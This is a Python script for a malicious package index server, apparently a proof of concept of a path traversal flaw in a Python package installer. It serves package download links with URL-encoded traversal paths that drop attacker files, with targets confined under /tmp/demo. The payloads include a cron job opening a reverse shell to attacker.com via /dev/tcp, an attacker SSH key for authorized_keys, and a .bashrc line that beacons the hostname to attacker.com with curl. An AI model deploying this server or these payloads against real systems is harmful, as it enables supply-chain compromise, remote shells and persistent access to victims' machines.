#!/usr/bin/env python3
"""
Malicious Package Index Server

This server simulates a compromised PyPI mirror that serves
packages with path traversal payloads in the download URLs.

Runs on port 8080 and waits for victim connections.
"""

import http.server
import os
import socketserver
import sys
from urllib.parse import quote, unquote

PORT = 8080

# =============================================================================
# ATTACK SCENARIOS
# =============================================================================

SCENARIOS = {
    "cron": {
        "target": "/tmp/demo/etc/cron.d/backdoor",
        "payload": b"""# Malicious cron job - reverse shell every minute
* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
""",
    },
    "ssh": {
        "target": "/tmp/demo/root/.ssh/authorized_keys",
        "payload": b"""# Attacker's SSH key for persistent access
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxxxATTACKERxxx attacker@evil.com
""",
    },
    "bashrc": {
        "target": "/tmp/demo/home/victim/.bashrc",
        "payload": b"""# Backdoored .bashrc - executes on every new shell
export PATH=$PATH:/usr/local/bin
curl -s http://attacker.com/beacon?h=$(hostname) &>/dev/null &
""",
    },
}

# Current active scenario
ACTIVE_SCENARIO = "cron"


class MaliciousIndexHandler(http.server.BaseHTTPRequestHandler):
    """Malicious PyPI-like index server."""

    def log_message(self, format, *args):
        print(f"[SERVER] {args[0]}")

    def do_GET(self):
        path = self.path.split('?')[0].split('#')[0]

        if path in ('/', '/simple/', '/simple'):
            self.serve_index()
        elif '/simple/malicious-package' in path:
            self.serve_package_links()
        elif '/scenario/' in path:
            self.set_scenario(path)
        elif '/status' in path:
            self.serve_status()
        else:
            self.serve_payload()

    def serve_index(self):
        """Serve the main package index."""
        html = """<!DOCTYPE html>
<html><head><title>Malicious PyPI</title></head>
<body>
<h1>Evil Package Index</h1>
<a href="/simple/malicious-package/">malicious-package</a>
</body></html>"""
        self.send_html(html)
        print("[SERVER] Served package index")

    def serve_package_links(self):
        """Serve package page with malicious download link."""
        scenario = SCENARIOS[ACTIVE_SCENARIO]
        target = scenario["target"]
        encoded = quote(target, safe='')

        html = f"""<!DOCTYPE html>
<html><head><title>malicious-package</title></head>
<body>
<h1>Links for malicious-package</h1>
<a href="/{encoded}#egg=malicious-package-1.0">malicious-package-1.0.tar.gz</a>
</body></html>"""

        self.send_html(html)
        print(f"[SERVER] Served malicious link -> {target}")
        print(f"[SERVER] URL-encoded as: /{encoded}")

    def serve_payload(self):
        """Serve the malicious payload."""
        decoded = unquote(self.path)
        scenario = SCENARIOS[ACTIVE_SCENARIO]
        payload = scenario["payload"]

        print(f"[SERVER] Client downloading: {decoded}")
        print(f"[SERVER] Sending {len(payload)} byte payload")

        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', len(payload))
        self.end_headers()
        self.wfile.write(payload)

    def set_scenario(self, path):
        """Switch active scenario."""
        global ACTIVE_SCENARIO
        name = path.split('/')[-1]
        if name in SCENARIOS:
            ACTIVE_SCENARIO = name
            self.send_html(f"<h1>Scenario set to: {name}</h1>")
            print(f"[SERVER] Scenario changed to: {name}")
        else:
            self.send_html(f"<h1>Unknown scenario: {name}</h1>", 404)

    def serve_status(self):
        """Show current server status."""
        scenario = SCENARIOS[ACTIVE_SCENARIO]
        html = f"""<!DOCTYPE html>
<html><head><title>Server Status</title></head>
<body>
<h1>Malicious Server Status</h1>
<p><b>Active Scenario:</b> {ACTIVE_SCENARIO}</p>
<p><b>Target Path:</b> {scenario['target']}</p>
<h2>Available Scenarios:</h2>
<ul>
<li><a href="/scenario/cron">cron</a> - /etc/cron.d/backdoor</li>
<li><a href="/scenario/ssh">ssh</a> - ~/.ssh/authorized_keys</li>
<li><a href="/scenario/bashrc">bashrc</a> - ~/.bashrc</li>
</ul>
</body></html>"""
        self.send_html(html)

    def send_html(self, content, code=200):
        self.send_response(code)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(content.encode())


def main():
    print("=" * 60)
    print("MALICIOUS PACKAGE INDEX SERVER")
    print("=" * 60)
    print(f"\nListening on 0.0.0.0:{PORT}")
    print(f"Active scenario: {ACTIVE_SCENARIO}")
    print(f"Target: {SCENARIOS[ACTIVE_SCENARIO]['target']}")
    print("\nEndpoints:")
    print(f"  http://server:{PORT}/simple/          - Package index")
    print(f"  http://server:{PORT}/status           - Server status")
    print(f"  http://server:{PORT}/scenario/cron    - Switch to cron attack")
    print(f"  http://server:{PORT}/scenario/ssh     - Switch to SSH attack")
    print(f"  http://server:{PORT}/scenario/bashrc  - Switch to bashrc attack")
    print("\n" + "=" * 60)
    print("Waiting for victim connections...")
    print("=" * 60 + "\n")

    with socketserver.TCPServer(("0.0.0.0", PORT), MaliciousIndexHandler) as httpd:
        httpd.serve_forever()


if __name__ == "__main__":
    main()
